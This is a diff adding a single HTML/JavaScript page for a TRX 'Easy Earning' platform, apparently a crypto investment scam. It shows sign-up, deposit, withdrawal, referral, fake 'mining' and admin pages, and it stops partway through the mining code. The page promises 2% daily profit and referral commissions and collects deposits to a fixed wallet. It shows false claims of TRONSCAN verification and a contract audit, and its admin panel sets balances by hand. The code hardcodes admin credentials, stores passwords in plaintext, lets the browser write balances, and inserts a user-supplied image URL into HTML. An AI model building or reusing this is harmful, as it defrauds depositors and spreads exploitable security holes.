@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Earning Crypto Platform</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body { font-family: 'Poppins', sans-serif; background-color: #0b0f19; }
+        .page { display: none; }
+        .page.active { display: flex; }
+        ::-webkit-scrollbar { width: 0px; background: transparent; }
+    </style>
+</head>
+<body class="text-gray-200 flex justify-center min-h-screen items-center sm:items-start">
+
+    <script>
+        // Official TRX (Tron) Vector Red Logo - Permanent & High Quality
+        const LOGO_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" class="w-24 h-24 mx-auto drop-shadow-[0_0_15px_rgba(239,68,68,0.5)]"><g fill="none" stroke="#ef4444" stroke-width="6" stroke-linejoin="round"><path d="M100 20 L165 75 L100 180 L35 75 Z"/><path d="M100 20 L100 180"/><path d="M35 75 L165 75"/><path d="M100 75 L35 130 L100 180 L165 130 Z"/></g></svg>`;
+    </script>
+
+    <!-- BLOCK SCREEN OVERLAY -->
+    <div id="blockScreen" class="page w-full max-w-md bg-[#0b0f19] min-h-screen flex-col justify-center items-center p-6 text-center z-50">
+        <div class="w-20 h-20 bg-red-500/10 text-red-500 rounded-full flex items-center justify-center text-4xl mb-4 animate-bounce">
+            <i class="fa-solid fa-user-slash"></i>
+        </div>
+        <h1 class="text-xl font-bold text-red-500">Access Denied!</h1>
+        <p class="text-sm text-gray-400 mt-2 max-w-xs">Your account has been temporarily or permanently suspended by the Admin.</p>
+        <button onclick="logout()" class="mt-6 bg-gray-800 text-gray-300 px-6 py-2.5 rounded-xl font-medium text-xs">Back to Login</button>
+    </div>
+
+    <!-- SIGN UP PAGE -->
+    <div id="signUpPage" class="page active w-full max-w-md bg-[#121826] min-h-screen flex-col justify-center p-6 shadow-2xl relative border-x border-gray-800">
+        <div class="text-center space-y-2 mb-6">
+            <div class="mb-2 flex items-center justify-center">
+                <script>document.write(LOGO_SVG);</script>
+            </div>
+            <p class="text-xs text-gray-400">Create a new account</p>
+        </div>
+        <div class="space-y-4">
+            <div>
+                <label class="text-xs text-gray-400 font-medium uppercase">Username</label>
+                <input type="text" id="regUser" placeholder="e.g., rony123" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-red-500 transition">
+            </div>
+            <div>
+                <label class="text-xs text-gray-400 font-medium uppercase">Password</label>
+                <input type="password" id="regPass" placeholder="Enter password" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-red-500 transition">
+            </div>
+            <div>
+    <label class="text-xs text-gray-400 font-medium uppercase">Referral Code</label>
+    <input type="text" id="regReferrer" placeholder="Referral code" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-red-500 transition">
+</div>
+            <button onclick="registerUser()" class="w-full bg-red-500 text-white font-bold text-sm py-3.5 rounded-xl shadow-lg hover:bg-red-600 transition cursor-pointer">Sign Up</button>
+            <p class="text-xs text-center text-gray-400">Already have an account? <span onclick="showPage('loginPage')" class="text-red-500 cursor-pointer hover:underline">Login here</span></p>
+        </div>
+    </div>
+
+    <!-- LOGIN PAGE -->
+    <div id="loginPage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-center p-6 shadow-2xl relative border-x border-gray-800">
+        <div class="text-center space-y-2 mb-6">
+            <div class="mb-2 flex items-center justify-center">
+                <script>document.write(LOGO_SVG);</script>
+            </div>
+            <p class="text-xs text-gray-400">Log in to your account</p>
+        </div>
+        <div class="space-y-4">
+            <div>
+                <label class="text-xs text-gray-400 font-medium uppercase">Username</label>
+                <input type="text" id="logUser" placeholder="Enter username" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-red-500 transition">
+            </div>
+            <div>
+                <label class="text-xs text-gray-400 font-medium uppercase">Password</label>
+                <input type="password" id="logPass" placeholder="Enter password" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-red-500 transition">
+            </div>
+            <button onclick="loginUser()" class="w-full bg-red-500 text-white font-bold text-sm py-3.5 rounded-xl shadow-lg hover:bg-red-600 transition cursor-pointer">Login</button>
+            <p class="text-xs text-center text-gray-400">New user? <span onclick="showPage('signUpPage')" class="text-red-500 cursor-pointer hover:underline">Create an account</span></p>
+        </div>
+    </div>
+
+    <!-- HOME PAGE -->
+    <div id="homePage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-between shadow-2xl relative border-x border-gray-800 pb-24">
+        <div class="p-4 flex justify-between items-center bg-[#1a2236] rounded-b-2xl border-b border-gray-800">
+            <div class="flex items-center gap-2">
+                <div class="w-12 h-12 flex items-center justify-center scale-50">
+                    <script>document.write(LOGO_SVG);</script>
+                </div>
+                <div>
+                    <p class="text-xs text-green-400 flex items-center gap-1"><span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span> Online</p>
+                </div>
+            </div>
+            <button onclick="logout()" class="w-9 h-9 bg-[#242f4d] rounded-xl flex items-center justify-center text-red-400 cursor-pointer"><i class="fa-solid fa-right-from-bracket"></i></button>
+        </div>
+        <div class="p-4 flex-1 space-y-6 overflow-y-auto">
+            <div class="bg-gradient-to-br from-[#1e2942] to-[#151f33] p-5 rounded-2xl border border-gray-700/50 shadow-xl">
+                <p class="text-xs text-gray-400 uppercase tracking-wider">Total Balance</p>
+                <div class="flex items-baseline gap-2 mt-1">
+                    <span id="mainBalance" class="text-3xl font-bold text-white">0.00</span>
+                    <span class="text-red-500 font-semibold text-sm">TRX</span>
+                </div>
+                <p id="vipBadge" class="text-[11px] text-gray-400 mt-2">Current Status: <span class="text-red-400 font-medium">No VIP Plan Active</span></p>
+            </div>
+<!-- Notice Board -->
+<div class="bg-[#1a2236] p-4 rounded-xl border border-blue-500/30 mb-6 shadow-lg">
+    <div class="flex items-center mb-2">
+        <span class="text-yellow-400 mr-2">ðŸ“¢</span>
+        <h3 class="text-white font-bold">Important Notice</h3>
+    </div>
+    <ul class="text-gray-300 text-xs space-y-2">
+        <li class="flex items-start">
+            <span class="mr-2 text-blue-400">â€¢</span>
+            <span>Earn daily 2% profit on your total TRX balance automatically.</span>
+        </li>
+        <li class="flex items-start">
+            <span class="mr-2 text-blue-400">â€¢</span>
+            <span>Get 15% commission for every successful referral.</span>
+        </li>
+        <li class="flex items-start">
+            <span class="mr-2 text-blue-400">â€¢</span>
+            <span>Your TRX balance is secure and verified by our system.</span>
+        </li>
+    </ul>
+</div>
+
+
+            <div class="grid grid-cols-5 gap-3">
+                <button onclick="showPage('rechargePage')" class="bg-[#1a2236] p-3 rounded-xl flex flex-col items-center justify-center gap-2 border border-gray-800 cursor-pointer">
+                    <div class="w-10 h-10 bg-red-500/10 text-red-500 rounded-xl flex items-center justify-center"><i class="fa-solid fa-wallet text-lg"></i></div>
+                    <span class="text-[11px] text-gray-300">Recharge</span>
+                </button>
+                <button onclick="showPage('withdrawPage')" class="bg-[#1a2236] p-3 rounded-xl flex flex-col items-center justify-center gap-2 border border-gray-800 cursor-pointer">
+                    <div class="w-10 h-10 bg-green-500/10 text-green-400 rounded-xl flex items-center justify-center"><i class="fa-solid fa-money-bill-transfer text-lg"></i></div>
+                    <span class="text-[11px] text-gray-300">Withdraw</span>
+                </button>
+                <button onclick="showPage('aboutPage')" class="bg-[#1a2236] p-4 rounded-xl text-center border border-gray-700 w-full mt-4">
+    <span class="text-xl"></span>
+    <p class="text-[10px] text-gray-400 uppercase">About Us</p>
+</button>
+
+                <button onclick="showPage('teamPage')" class="bg-[#1a2236] p-3 rounded-xl flex flex-col items-center justify-center gap-2 border border-gray-800 cursor-pointer">
+                    <div class="w-10 h-10 bg-blue-500/10 text-blue-400 rounded-xl flex items-center justify-center"><i class="fa-solid fa-users text-lg"></i></div>
+                    <span class="text-[11px] text-gray-300">Invite</span>
+                </button>
+                <div onclick="showPage('historyPage')" class="flex flex-col items-center cursor-pointer">
+    <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 mb-1">
+        <span class="text-white"></span>
+    </div>
+    <span class="text-[10px] text-gray-400">History</span>
+</div>
+<button onclick="window.open('https://t.me/easyerningtrx', '_blank');" class="flex flex-col items-center justify-center w-10 h-10 bg-purple-500/10 text-purple-400 rounded-lg">
+    <span></span>
+    <span class="text-[11px] text-gray-300">Support</span>
+</button>
+
+            </div>
+
+            <div class="bg-gradient-to-r from-red-500/10 to-orange-500/5 p-4 rounded-xl border border-red-500/20 space-y-3">
+                <div class="flex justify-between items-center">
+                    <h3 class="text-sm font-semibold text-red-400 flex items-center gap-2"><i class="fa-solid fa-circle-notch" id="mineIcon"></i> Smart TRX Miner</h3>
+                    <span id="miningStatus" class="text-[10px] bg-gray-800 text-gray-400 px-2 py-0.5 rounded-full">Idle</span>
+                </div>
+                <div class="bg-[#121826] p-3 rounded-lg border border-gray-800 text-center">
+                    <p class="text-[11px] text-gray-400 uppercase">Mined TRX (Today's 2%)</p>
+                    <p id="minedAmount" class="text-xl font-mono font-bold text-green-400 mt-1">0.000000</p>
+                </div>
+                <button id="miningBtn" onclick="toggleMining()" class="w-full bg-red-500 text-white font-bold text-xs py-2.5 rounded-lg shadow-md cursor-pointer">Start Mining</button>
+            </div>
+            <div>
+                <h2 class="text-sm font-semibold text-white mb-3">Investment Plan</h2>
+                <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 space-y-3">
+                    <div class="flex justify-between items-center">
+                        <div>
+                            <span class="bg-red-500/20 text-red-400 text-[10px] px-2 py-0.5 rounded-full font-bold">VIP Mining Pool</span>
+                            <h3 class="text-sm font-medium text-white mt-1">Flexible VIP Plan</h3>
+                            <p class="text-xs text-gray-400">Daily Profit: <span class="text-green-400">2%</span></p>
+                        </div>
+                        <div class="text-right">
+                            <input type="number" id="investAmountField" placeholder="Amount" class="w-24 bg-[#121826] border border-gray-700 rounded-lg p-2 text-xs text-white text-center focus:outline-none">
+                        </div>
+                    </div>
+                    <button id="buyPlanBtn" onclick="buyVIPPlan()" class="w-full bg-red-500 text-white font-bold text-xs py-2 rounded-lg shadow-md cursor-pointer">Activate VIP Plan</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="absolute bottom-0 left-0 right-0 bg-[#1a2236] border-t border-gray-800 px-6 py-3 grid grid-cols-4 text-center rounded-t-xl">
+            <button onclick="showPage('homePage')" class="text-red-500 flex flex-col items-center gap-1"><i class="fa-solid fa-house text-lg"></i><span class="text-[10px]">Home</span></button>
+            <button onclick="alert('Upgrade your pool instantly.')" class="text-gray-400 flex flex-col items-center gap-1"><i class="fa-solid fa-gem text-lg"></i><span class="text-[10px]">VIP</span></button>
+            <button onclick="showPage('teamPage')" class="text-gray-400 flex flex-col items-center gap-1"><i class="fa-solid fa-share-nodes text-lg"></i><span class="text-[10px]">Team</span></button>
+            <button onclick="openProfilePage()" class="text-gray-400 flex flex-col items-center gap-1"><i class="fa-solid fa-user text-lg"></i><span class="text-[10px]">Profile</span></button>
+        </div>
+    </div>
+<div id="historyPage" class="page hidden w-full max-w-md bg-[#121826] min-h-screen p-6 shadow-2xl border-x border-gray-800">
+    <div class="flex items-center mb-6">
+        <button onclick="showPage('homePage')" class="text-white mr-4"></button>
+        <h2 class="text-white text-lg font-bold">Transaction History</h2>
+    </div>
+    
+    <div id="historyList" class="space-y-3">
+        <p class="text-gray-400 text-sm text-center">No history available</p>
+    </div>
+</div>
+
+    <!-- RECHARGE PAGE -->
+    <div id="rechargePage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-between shadow-2xl relative border-x border-gray-800 pb-10">
+        <div class="p-5 flex items-center gap-4 bg-[#1a2236] rounded-b-2xl border-b border-gray-800">
+            <button onclick="showPage('homePage')" class="text-gray-400 hover:text-white"><i class="fa-solid fa-arrow-left text-lg"></i></button>
+            <h1 class="text-base font-semibold text-white">Recharge / Deposit</h1>
+        </div>
+        <div class="p-5 flex-1 space-y-6">
+            <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 space-y-2">
+                <label class="text-xs text-gray-400 uppercase font-medium">Your TRX Address (TRC20)</label>
+                <div class="flex bg-[#121826] p-3 rounded-xl border border-gray-800 items-center justify-between">
+                    <span id="trxAddressText" class="text-xs text-red-500 font-mono truncate mr-2 select-all">TEUvrVossYjjuaC8NEhSzs1APj781gby6v</span>
+                    <button onclick="copyAddress()" class="bg-red-500/10 text-red-500 text-xs px-3 py-1.5 rounded-lg">Copy</button>
+                </div>
+            </div>
+            <div class="space-y-4">
+                <p class="text-[11px] text-red-400">Note: Minimum recharge is 10 TRX. Submit TxID after sending.</p>
+                <input type="number" id="depositAmountField" placeholder="Deposit Amount" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none">
+                <input type="text" id="txIdField" placeholder="Transaction ID (TxID)" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none">
+                <button onclick="submitDeposit()" class="w-full bg-red-500 text-white font-bold text-sm py-3.5 rounded-xl shadow-lg">Submit Deposit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WITHDRAW PAGE -->
+    <div id="withdrawPage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-between shadow-2xl relative border-x border-gray-800 pb-10">
+        <div class="p-5 flex items-center gap-4 bg-[#1a2236] rounded-b-2xl border-b border-gray-800">
+            <button onclick="showPage('homePage')" class="text-gray-400 hover:text-white"><i class="fa-solid fa-arrow-left text-lg"></i></button>
+            <h1 class="text-base font-semibold text-white">Withdraw TRX</h1>
+        </div>
+        <div class="p-5 flex-1 space-y-6">
+            <div class="bg-[#1a2236] p-5 rounded-2xl border border-gray-800">
+                <p class="text-xs text-gray-400">Withdrawable Balance</p>
+                <p class="text-2xl font-bold text-white mt-1"><span class="withdrawBalanceLabel">0.00</span> <span class="text-green-400 text-sm">TRX</span></p>
+            </div>
+            <div class="space-y-4">
+                <input type="text" id="withdrawAddress" placeholder="Enter TRX address" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none">
+                <input type="number" id="withdrawAmount" placeholder="Withdraw Amount" class="w-full bg-[#1a2236] border border-gray-800 rounded-xl p-3 text-sm text-white focus:outline-none">
+                <button onclick="submitWithdraw()" class="w-full bg-green-500 text-black font-bold text-sm py-3.5 rounded-xl shadow-lg">Confirm Withdrawal</button>
+                <div class="bg-[#1a2236] p-5 rounded-xl border border-gray-700 mt-6">
+    <h3 class="text-white text-lg font-bold mb-4 text-center">Withdrawal Rules</h3>
+    <ul class="text-gray-400 text-sm space-y-2">
+        <li>â€¢ Minimum withdrawal amount is 10 TRX.</li>
+        <li>â€¢ A service fee of 5% will be deducted from the withdrawal amount.</li>
+        <li>â€¢ Ensure your wallet address is verified before submitting the request.</li>
+    </ul>
+</div>
+          </div>
+        </div>
+    </div>
+
+    <!-- TEAM PAGE -->
+    <div id="teamPage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-between shadow-2xl relative border-x border-gray-800 pb-24">
+        <div class="p-5 flex items-center gap-4 bg-[#1a2236] rounded-b-2xl border-b border-gray-800">
+            <button onclick="showPage('homePage')" class="text-gray-400 hover:text-white"><i class="fa-solid fa-arrow-left text-lg"></i></button>
+            <h1 class="text-base font-semibold text-white">Referral Team</h1>
+        </div>
+        <div class="p-4 flex-1 space-y-6">
+        <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 mb-4">
+            <p class="text-xs text-gray-400">Your Referral Link:</p>
+            <input type="text" id="myRefLink" class="w-full bg-black p-2 mt-2 rounded border border-gray-700 text-xs text-red-500" readonly>
+            <button onclick="copyRefLink()" class="mt-3 w-full bg-red-500 py-2 rounded text-xs font-bold text-white">Copy Link</button>
+        </div>
+
+            <div class="grid grid-cols-2 gap-4">
+                <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 text-center">
+                    <p class="text-xs text-gray-400">Total Members</p>
+                    <p class="text-xl font-bold text-white mt-1">0</p>
+                </div>
+                <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 text-center">
+                    <p class="text-xs text-gray-400">Team Rewards</p>
+                    <p class="text-xl font-bold text-blue-400 mt-1">0.00 TRX</p>
+                </div>
+            </div>
+        </div>
+    </div>
+<div id="aboutPage" class="page w-full min-h-screen bg-[#0f172a] fixed top-0 left-0 z-[9999] hidden">
+    
+    <div class="flex flex-col w-full h-full p-4">
+        
+        <div class="flex justify-end w-full mb-4">
+            <button onclick="showPage('homePage')" class="text-white text-3xl p-2"></button>
+        </div>
+
+        <div class="flex justify-end w-full">
+            <div class="bg-[#1a2236] p-5 rounded-xl border border-blue-500/50 w-[90%]">
+                <h3 class="text-blue-400 font-bold mb-4 flex items-center">
+                    <span class="mr-2"></span> OFFICIAL TRX PROTOCOL
+                </h3>
+                <div class="mt-6 border-t border-blue-500/30 pt-4">
+    <div class="flex items-center justify-between mb-2">
+        <span class="text-gray-400 text-xs">Network Status</span>
+        <div class="flex items-center">
+            <span class="relative flex h-2 w-2 mr-2">
+              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+              <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            </span>
+            <span class="text-green-500 text-xs font-bold">CONNECTED</span>
+        </div>
+    </div>
+    
+    <div class="bg-black/20 p-3 rounded-lg border border-blue-900/30">
+        <p class="text-[10px] text-gray-500 break-all mb-1">CONTRACT ADDRESS:</p>
+        <p class="text-[10px] text-blue-300 font-mono">TPr9...xYz987vBca123456789</p>
+    </div>
+    <p class="text-[9px] text-gray-500 mt-2 text-center">Verified by TRONSCAN Explorer</p>
+</div>
+
+                
+                <div class="flex items-center mb-4">
+                    <div class="bg-blue-600 text-white font-black px-3 py-1 rounded-full mr-3 text-sm">TRX</div>
+                    <p class="text-white text-sm font-semibold">TRC20 Blockchain Verified</p>
+                </div>
+                <div class="flex justify-center mb-4">
+    <img src="1000029783.jpg" 
+         onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tron-trx-logo.png';" 
+         alt="TRX Logo" 
+         class="w-24 h-24 rounded-full border-4 border-blue-500 shadow-xl">
+</div>
+
+
+                <p class="text-gray-400 text-xs mb-3">
+                    Our platform operates on the Tron (TRC20) network, providing decentralized liquidity and secure automated mining contracts.
+                </p>
+
+                <div class="flex items-center mt-4">
+                    <span class="text-yellow-500 mr-2"></span>
+                    <p class="text-gray-400 text-xs italic">Smart Contract Audited & Secured by TRON Mainnet.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <!-- PROFILE PAGE -->
+    <div id="profilePage" class="page w-full max-w-md bg-[#121826] min-h-screen flex-col justify-between shadow-2xl relative border-x border-gray-800 pb-24 overflow-y-auto">
+        <div class="p-5 flex items-center gap-4 bg-[#1a2236] rounded-b-2xl border-b border-gray-800">
+            <button onclick="showPage('homePage')" class="text-gray-400 hover:text-white"><i class="fa-solid fa-arrow-left text-lg"></i></button>
+            <h1 class="text-base font-semibold text-white">My Premium Profile</h1>
+        </div>
+        <div class="p-5 flex-1 space-y-6">
+            <div class="text-center space-y-2 bg-[#1a2236] p-5 rounded-2xl border border-gray-800">
+                <div id="profilePicContainer" class="w-20 h-20 bg-gradient-to-tr from-red-500 to-orange-600 rounded-full flex items-center justify-center text-white text-3xl font-bold mx-auto overflow-hidden">
+                    <i class="fa-solid fa-user-astronaut"></i>
+                </div>
+                <h2 id="profileUsernameDisplay" class="text-lg font-bold text-white mt-2">User_Name</h2>
+                <span id="profileVipStatus" class="text-[10px] bg-red-500/20 text-red-400 px-2.5 py-0.5 rounded-md uppercase font-bold">No Active Plan</span>
+                
+                <div class="mt-4 pt-2 border-t border-gray-800 space-y-2">
+                    <input type="text" id="propicURLField" placeholder="Paste Profile Image URL Here" class="w-full bg-[#121826] border border-gray-800 rounded-lg p-2 text-xs text-white text-center focus:outline-none">
+                    <button onclick="updateProfilePicture()" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold text-[11px] py-2 rounded-lg shadow-md transition">Update Photo</button>
+                </div>
+            </div>
+            <div class="grid grid-cols-2 gap-3">
+                <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800">
+                    <p class="text-[11px] text-gray-400 uppercase">Available Balance</p>
+                    <p class="text-base font-bold text-white mt-0.5"><span class="profileBalanceLabel">0.00</span> TRX</p>
+                </div>
+                <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800">
+                    <p class="text-[11px] text-gray-400 uppercase">Total Investment</p>
+                    <p class="text-base font-bold text-white mt-0.5"><span id="profileTotalInvest">0.00</span> TRX</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL PAGE -->
+    <div id="adminPanelPage" class="page w-full max-w-md bg-[#0f1422] min-h-screen flex-col p-5 shadow-2xl relative border-x border-gray-800 overflow-y-auto">
+        <div class="flex justify-between items-center border-b border-gray-800 pb-4 mb-5">
+            <h1 class="text-lg font-bold text-red-500 flex items-center gap-2"><i class="fa-solid fa-user-gear"></i> Control Admin</h1>
+            <button onclick="logout()" class="text-xs bg-gray-800 text-gray-300 px-3 py-1.5 rounded-lg">Exit Admin</button>
+        </div>
+        <div class="space-y-6">
+            <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 space-y-3">
+                <h3 class="text-xs font-semibold text-gray-400 uppercase">Manage User Balance</h3>
+                <input type="text" id="admTargetUser" placeholder="Target Username" class="w-full bg-[#121826] border border-gray-800 rounded-lg p-2.5 text-xs text-white focus:outline-none">
+                <input type="number" id="admAmount" placeholder="Amount of TRX" class="w-full bg-[#121826] border border-gray-800 rounded-lg p-2.5 text-xs text-white focus:outline-none">
+                <button onclick="adminModifyBalance(true)" class="w-full bg-green-500 text-black font-bold text-xs py-2.5 rounded-lg">Add Balance / Approve Deposit</button>
+                <button onclick="adminModifyBalance(false)" class="w-full bg-red-500 text-white font-bold text-xs py-2.5 rounded-lg">Deduct Balance</button>
+            </div>
+            <div class="space-y-2">
+                <h3 class="text-xs font-semibold text-gray-400 uppercase">Registered Users & Controls</h3>
+                <div id="adminUserListContainer" class="space-y-2 max-h-60 overflow-y-auto pr-1"></div>
+            </div>
+        </div>
+    <div class="bg-[#1a2236] p-4 rounded-xl border border-gray-800 space-y-3 mt-4">
+    <h3 class="text-xs font-semibold text-gray-400 uppercase">Withdraw Requests</h3>
+    <div id="withdrawRequestContainer" class="space-y-2"></div>
+</div>
+</div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcKWB9xVN8CpJ5WC-AQRHV-gM",
+            authDomain: "easy-earning-db.firebaseapp.com",
+            databaseURL: "https://easy-earning-db-default-rtdb.firebaseio.com",
+            projectId: "easy-earning-db",
+            storageBucket: "easy-earning-db.firebasestorage.app",
+            messagingSenderId: "467879836865",
+            appId: "1:467879836865:web:42e99342d10f274cb6e81f"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let currentUser = null;
+        let miningInterval = null;
+        let todayMined = 0;
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            const targetPage = document.getElementById(pageId);
+            if(targetPage) targetPage.classList.add('active');
+        }
+        
+function registerUser() {
+    const user = document.getElementById('regUser').value.trim().toLowerCase();
+    const pass = document.getElementById('regPass').value.trim();
+    // URL à¦¥à§‡à¦•à§‡ à¦°à§‡à¦«à¦¾à¦°à§‡à¦² à¦•à§‹à¦¡ à¦¨à§‡à¦“à§Ÿà¦¾
+    const urlParams = new URLSearchParams(window.location.search);
+    const referrer = urlParams.get('ref') || "none"; 
+
+    if(!user || !pass) { alert('Please fill in all fields!'); return; }
+
+    database.ref('users/' + user).once('value', snapshot => {
+        if(snapshot.exists()) { alert('Username already exists!'); } 
+        else {
+            // à¦°à§‡à¦«à¦¾à¦°à¦¾à¦° à¦¸à§‡à¦­ à¦¹à¦šà§à¦›à§‡
+            let userData = { username: user, password: pass, balance: 0.00, investment: 0.00, vipActive: false, profilePic: "", isBlocked: false, referredBy: referrer };
+            database.ref('users/' + user).set(userData);
+            
+            // à¦°à§‡à¦«à¦¾à¦°à§‡à¦² à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¬à¦¾à§œà¦¾à¦¨à§‹
+            if(referrer !== "none") {
+                database.ref('users/' + referrer + '/totalReferrals').transaction(current => (current || 0) + 1);
+            }
+            alert('Registration Successful! Please login.');
+            showPage('loginPage');
+        }
+    });
+}
+
+
+        function loginUser() {
+            const user = document.getElementById('logUser').value.trim();
+            const pass = document.getElementById('logPass').value.trim();
+
+            // SECURE CRYTOGRAPHIC SYSTEM LOGINS
+            if(user === 'admin_secure_99x#' && pass === 'Trx#Secure@Pass!2026') {
+                localStorage.setItem('easyEarningUser', 'admin');
+                alert('Welcome Chief! Entering Admin Panel.');
+                loadAdminMonitor();
+                showPage('adminPanelPage');
+                return;
+            }
+
+            // Normal user logic checks username as lowercase
+            const userLower = user.toLowerCase();
+            database.ref('users/' + userLower).once('value', snapshot => {
+                if(!snapshot.exists()) { alert('User not found!'); return; }
+                let userData = snapshot.val();
+                if(userData.password !== pass) { alert('Wrong password!'); return; }
+                
+                if(userData.isBlocked) {
+                    showPage('blockScreen');
+                    return;
+                }
+
+                localStorage.setItem('easyEarningUser', userLower);
+                startUserSync(userLower);
+            });
+        }
+
+        function startUserSync(user) {
+            database.ref('users/' + user).on('value', syncSnap => {
+                if(syncSnap.exists()) { 
+                    currentUser = syncSnap.val(); 
+                    if(currentUser.isBlocked) {
+                        database.ref('users/' + user).off();
+                        showPage('blockScreen');
+                        return;
+                    }
+                    updateUI(); 
+                }
+            });
+            showPage('homePage');
+        }
+
+        function updateUI() {
+            if(!currentUser) return;
+            const bal = parseFloat(currentUser.balance).toFixed(2);
+            const inv = parseFloat(currentUser.investment).toFixed(2);
+            document.getElementById('mainBalance').innerText = bal;
+            document.querySelectorAll('.withdrawBalanceLabel').forEach(el => el.innerText = bal);
+            document.querySelectorAll('.profileBalanceLabel').forEach(el => el.innerText = bal);
+            document.getElementById('profileTotalInvest').innerText = inv;
+
+            const picContainer = document.getElementById('profilePicContainer');
+            if(currentUser.profilePic && currentUser.profilePic !== "") {
+                picContainer.innerHTML = `<img src="${currentUser.profilePic}" class="w-full h-full object-cover rounded-full">`;
+            } else {
+                picContainer.innerHTML = `<i class="fa-solid fa-user-astronaut"></i>`;
+            }
+
+            const badge = document.getElementById('vipBadge');
+            const profBadge = document.getElementById('profileVipStatus');
+            const buyBtn = document.getElementById('buyPlanBtn');
+
+            if(currentUser.vipActive) {
+                badge.innerHTML = `Current Status: <span class="text-red-500 font-bold">VIP 1 ACTIVE ðŸš€</span>`;
+                profBadge.className = "text-[10px] bg-red-500/20 text-red-500 px-2.5 py-0.5 rounded-md uppercase font-bold tracking-wide";
+                profBadge.innerText = "VIP 1";
+                buyBtn.innerText = "VIP Active (Mining Enabled)";
+                buyBtn.disabled = true;
+                buyBtn.className = "w-full bg-gray-800 text-gray-500 font-bold text-xs py-2 rounded-lg cursor-not-allowed";
+            } else {
+                badge.innerHTML = `Current Status: <span class="text-red-400 font-medium">No VIP Plan Active</span>`;
+                profBadge.className = "text-[10px] bg-red-500/20 text-red-400 px-2.5 py-0.5 rounded-md uppercase font-bold tracking-wide";
+                profBadge.innerText = "No Active Plan";
+                buyBtn.innerText = "Activate VIP Plan";
+                buyBtn.disabled = false;
+                buyBtn.className = "w-full bg-red-500 text-white font-bold text-xs py-2 rounded-lg shadow-md cursor-pointer";
+            }
+        }
+
+        function buyVIPPlan() {
+            if(!currentUser) return;
+            let amount = parseFloat(document.getElementById('investAmountField').value);
+            if(isNaN(amount) || amount < 10) { alert('Please enter at least 10 TRX!'); return; }
+            if(currentUser.balance < amount) { alert('Insufficient balance!'); return; }
+
+            let newBal = currentUser.balance - amount;
+            let newInv = currentUser.investment + amount;
+            database.ref('users/' + currentUser.username).update({ balance: newBal, investment: newInv, vipActive: true });
+            alert('VIP Plan Activated Successfully!');
+            document.getElementById('investAmountField').value = '';
+        }
+
+        function toggleMining() {
+            if(!currentUser) return;
+            if(!currentUser.vipActive) { alert('Activate a VIP plan first!'); return; }
+
+            const btn = document.getElementById('miningBtn');
+            const status = document.getElementById('miningStatus');
+            const icon = document.getElementById('mineIcon');
+
+            if(miningInterval) {
+                clearInterval(miningInterval);
+                miningInterval = null;
+                let finalBal = currentUser.balance + todayMined;
+                database.ref('users/' + currentUser.username).update({ balance: finalBal });
+                todayMined = 0;
+                document.getElementById('minedAmount').innerText = "0.000000";
+                btn.innerText = "Start Mining";
+                btn.className = "w-full bg-red-500 text-white font-bold text-xs py-2.5 rounded-lg shadow-md cursor-pointer";
+                status.innerText = "Idle";
+                status.className = "text-[10px] bg-gray-800 text-gray-400 px-2 py-0.5 rounded-full";
+                icon.classList.remove('animate-spin', 'text-red-500');
+                alert('Profit Claimed successfully!');
+            } else {
+                status.innerText = "Mining TRX...";
+                status.className = "text-[10px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded-full font-medium animate-pulse";
+                btn.innerText = "Stop & Claim Earnings";
